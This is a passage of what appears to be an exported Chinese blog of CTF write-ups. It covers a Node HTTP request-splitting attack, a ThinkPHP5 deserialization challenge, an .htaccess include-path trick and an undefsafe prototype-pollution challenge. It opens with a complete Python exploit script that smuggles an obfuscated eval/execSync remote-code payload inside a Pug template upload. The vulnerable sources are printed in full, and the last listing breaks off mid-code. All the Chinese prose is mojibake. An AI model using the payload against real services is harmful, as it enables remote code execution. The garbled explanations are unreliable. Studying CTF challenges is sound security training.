<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;&quot;&quot;&quot;</span>.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">body = <span class="string">&quot;&quot;&quot;------WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;lethe.pug&quot;</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)</span></span><br><span class="line"><span class="string">-return x</span></span><br><span class="line"><span class="string">------WebKitFormBoundarysAs7bV3fMHq0JXUt--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.<span class="built_in">format</span>(<span class="built_in">len</span>(body), body) \</span><br><span class="line">    .replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;\u012b&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\u0120&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&#x27;\r\n&#x27;</span>, <span class="string">&#x27;\u010d\u010a&#x27;</span>)    \</span><br><span class="line">    .replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\u0122&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;\u0a27&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\u015b&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\u015d&#x27;</span>) \</span><br><span class="line">    + <span class="string">&#x27;GET&#x27;</span> + <span class="string">&#x27;\u0120&#x27;</span> + <span class="string">&#x27;/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">requests.get(</span><br><span class="line">    <span class="string">&#x27;http://0cf1e7a3-8f19-4b14-be8b-65ec8fd4fc84.node3.buuoj.cn/core?q=&#x27;</span> + payload)</span><br><span class="line"></span><br><span class="line">print(requests.get(</span><br><span class="line">    <span class="string">&#x27;http://0cf1e7a3-8f19-4b14-be8b-65ec8fd4fc84.node3.buuoj.cn/?action=lethe&#x27;</span>).text)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title>å¼ºç½‘æ¯Upload</title>
    <url>/2021/05/14/%E5%BC%BA%E7%BD%91%E6%9D%AFUpload/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul>
<li>Thinkphp5ååºåˆ—åŒ–</li>
<li>Phar</li>
</ul>
<h1 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h1><p> ååºåˆ—åŒ–çš„è§¦å‘ï¼Œæ‰¾unserializeï¼Œå‘ç°å¾ˆå·§</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $profile=cookie(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">&#x27;user&#x27;</span>)-&gt;where(<span class="string">&quot;ID&quot;</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;find();</span><br><span class="line">        <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>è¿™ç›´æ¥ååºåˆ—åŒ–è§¦å‘äº†ï¼Œé‚£ä¹ˆå†æ‰¾ä¸ªlogin_checkçš„è§¦å‘ç‚¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">&quot;http://&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>].$_SERVER[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">        <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>æ³¨å†Œçš„æ—¶å€™å°±å¯ä»¥è§¦å‘ï¼Œå‘ƒï¼Œæˆ‘ä»¥ä¸ºæ˜¯æ‰“åŸç”Ÿé“¾å­ï¼Œç»“æœå¥½åƒä¸æ˜¯</p>
]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>XNUCA2019QualifierEasyPHP</title>
    <url>/2021/05/12/XNUCA2019QualifierEasyPHP/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h1><p>å…ˆæ¥çœ‹çœ‹php.iniå’Œ.htaccessçš„åŒºåˆ«</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.orcode.com&#x2F;question&#x2F;483978_kadb02.html</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå³æ˜¯æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªå¯ä»¥å½±å“æˆ‘ä»¬è‡ªå·±ã€‚ä½†æ˜¯.htaccessä¹Ÿåªä¸è¿‡æ˜¯apache2é…ç½®ä¸­çš„ä¸€ä¸ªæ¨¡å—ï¼Œphp.iniä¸­çš„é…ç½®æ˜¯éš¶å±äºapache.confå½“ä¸­çš„</p>
<p>æ•…æˆ‘ä»¬æƒ³è¦ä¿®æ”¹ä»€ä¹ˆçš„è¯ç›´æ¥çœ‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;ini.list.php</span><br></pre></td></tr></table></figure>

<p><strong>htaccessç”Ÿæ•ˆ</strong></p>
<p>å¦‚æœå°è¯•ä¸Šä¼ htaccessæ–‡ä»¶ä¼šå‘ç°å‡ºç°å“åº”500çš„é—®é¢˜ï¼Œå› ä¸ºæ–‡ä»¶å°¾æœ‰Just one chance è¿™é‡Œé‡‡ç”¨# \çš„æ–¹å¼å°†æ¢è¡Œç¬¦è½¬ä¹‰æˆæ™®é€šå­—ç¬¦ï¼Œå°±å¯ä»¥ç”¨#æ¥æ³¨é‡Šå•è¡Œäº†ã€‚</p>
<h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><h2 id="æ­£è§£"><a href="#æ­£è§£" class="headerlink" title="æ­£è§£"></a>æ­£è§£</h2><p>é¢˜ç›®æ˜¯æ”¾å‡ºæºç çš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;fl3g.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nJust one chance&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è€Œæˆ‘ä»¬çŸ¥é“åŒ…å«äº†f13g.phpï¼Œ ç”±äºæ¯æ¬¡è®¿é—®éƒ½ä¼šåˆ é™¤æˆ‘ä»¬çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å…¶å®ä¸èƒ½ç›´æ¥å†™å…¥f13g.phpï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³æƒ³è¿˜æœ‰ä»€ä¹ˆå¯ä»¥åšï¼Ÿ</p>
<p>æ ¹æ®å¸ˆå‚…çš„WPï¼Œæˆ‘ä»¬å¯ä»¥åœ¨php.iniçš„é…ç½®ä¸­æ‰¾åˆ°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;ini.core.php#ini.include-path</span><br></pre></td></tr></table></figure>

<p>çœ‹ä¸‹ç¿»è¯‘</p>
<p><img src="XNUCA2019QualifierEasyPHP/image-20210512215117627.png" alt="image-20210512215117627"></p>
<p>æ„æ€æ˜¯ä¿®æ”¹ä¹‹åå½“æˆ‘ä»¬è¿›è¡Œincludeçš„æ“ä½œæ—¶ï¼Œä¼šä¼˜å…ˆçœ‹æˆ‘ä»¬æŒ‡å®šçš„é…ç½®è·¯å¾„ï¼Œä¹‹åå†å›æ¥</p>
<p>å¯æ˜¯è¿™åˆæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Œæˆ‘ä»¬æ€ä¹ˆåŠå»æ§åˆ¶å†™å…¥çš„è·¯å¾„æ–‡ä»¶å‘¢</p>
<p>å’‹éƒ½å¤ç°ä¸å‡ºæ¥ï¼Œç©å°¼ç›</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;20175211lyz&#x2F;p&#x2F;11740901.html#1%E3%80%81error_log%E7%BB%93%E5%90%88log_errors%E8%87%AA%E5%AE%9A%E4%B9%89%E9%94%99%E8%AF%AF%E6%97%A5%E5%BF%97</span><br></pre></td></tr></table></figure>





<p>éšä¾¿æ‰¾ä¸ªåœ°æ–¹æ”¾ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> python2 -m SimpleHTTPServer  <span class="number">8001</span></span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
        <tag>PHP.INI</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘é¼2020Notes</title>
    <url>/2021/05/13/%E7%BD%91%E9%BC%8E2020Notes/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul>
<li>JSåŸå‹é“¾æ±¡æŸ“</li>
<li>undefsafe çš„CVE</li>
</ul>
<p>å…³äºåŸå‹é“¾ï¼š</p>
<p>å…¶å®åŸå‹é“¾è¿™ä¸ªä¸œè¥¿å¦‚æœæ¥è§¦è¿‡jsçš„å¼€å‘å°±å¯ä»¥æ˜ç™½äº†ï¼ŒJavascriptæ˜¯æ²¡æœ‰ç±»çš„æ¦‚å¿µçš„ï¼Œæœ‰çš„åªæœ‰ä¸€ä¸ªç»§æ‰¿é“¾ä¸€æ ·çš„ä¸œè¥¿ï¼Œæ‰€æœ‰çš„ç»§æ‰¿é“¾æœ€ç»ˆåˆä¼šæŒ‡å‘Objectï¼Œè¿™ç§ç‰¹æ€§å¯¼è‡´äº†ä¸€ç§æƒ…å†µï¼Œå½“ç”¨æˆ·å¯ä»¥èµ‹å€¼çš„æ—¶å€™è‹¥å…¶å¯¹ä¸Šçº§èµ‹å€¼ï¼Œä¾¿å¯ä»¥ç›´æ¥å¯¼è‡´åŒçº§ï¼Œæˆ–è€…ä¸‹çº§çš„æ‰€æœ‰å¯¹è±¡éƒ½æ‹¥æœ‰äº†è¿™ä¸ªå±æ€§ï¼Œå…·ä½“å®é™…ä¾‹å­å¦‚ä¸‹ï¼š</p>
<p><img src="%E7%BD%91%E9%BC%8E2020Notes/image-20210513174107203.png" alt="image-20210513174107203"></p>
<p><img src="%E7%BD%91%E9%BC%8E2020Notes/image-20210513180128523.png" alt="image-20210513180128523"></p>
<p>ä¸¤å¼ å›¾å°±å¾ˆæ¸…æ™°çš„è¡¨è¾¾äº†ä»–ä»¬ä¹‹é—´çš„å…³ç³»ï¼Œå½“é€šè¿‡</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">__proto__ </span><br></pre></td></tr></table></figure>

<p>èµ‹å€¼çš„æ—¶å€™ä¾¿ä¼šè‡ªåŠ¨çš„å‘ä¸Šçº§å±æ€§è¿›è¡Œä¸€ä¸ªèµ‹å€¼ï¼Œé‚£ä¹ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¯·æ±‚ä¸€ä¸ªå¯¹è±¡çš„å±æ€§çš„æ—¶å€™ï¼Œè‹¥å…¶æ‹¥æœ‰å±æ€§ï¼Œä¾¿ä¼šä¼˜å…ˆè¾“å‡ºå®ƒçš„å€¼ï¼Œè‹¥å…¶æ²¡æœ‰ï¼Œåˆ™ä¼šæ ¹æ®åŸå‹é“¾å‘çˆ¶ç±»è¯·æ±‚~ï¼Œè€Œæ‰€æœ‰çš„å‡½æ•°çš„æœ€ä¸Šçº§éƒ½æ˜¯Obojectï¼Œæ¢å¥è¯è¯´ï¼Œåªè¦èƒ½å¤Ÿæ§åˆ¶Obojectçš„å€¼ï¼Œå®é™…ä¸Šä¹Ÿå°±å¯ä»¥æ±¡æŸ“æ‰€æœ‰çš„æˆå‘˜å±æ€§äº†ã€‚</p>
<h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>é‚£ä¹ˆå›åˆ°é¢˜ç›®ï¼Œé¢˜ç›®æ˜¯æ”¾å‡ºæºç çš„ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.owner = <span class="string">&quot;whoknows&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">write_note</span>(<span class="params">author, raw_note</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.note_list[(<span class="built_in">this</span>.num++).toString()] = &#123;<span class="string">&quot;author&quot;</span>: author,<span class="string">&quot;raw_note&quot;</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">get_note</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="built_in">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">edit_note</span>(<span class="params">id, author, raw</span>)</span> &#123;</span><br><span class="line">        undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">        undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">get_all_notes</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">remove_note</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="built_in">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">&quot;nobody&quot;</span>, <span class="string">&quot;this is nobody&#x27;s first note&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;Notebook&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/add_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;please use POST to add a note&#x27;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;add note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;did not add note&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/edit_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/delete_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to delete a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete done&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">&#x27;note&#x27;</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/status&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">&#x27;Sorry cant find that!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span 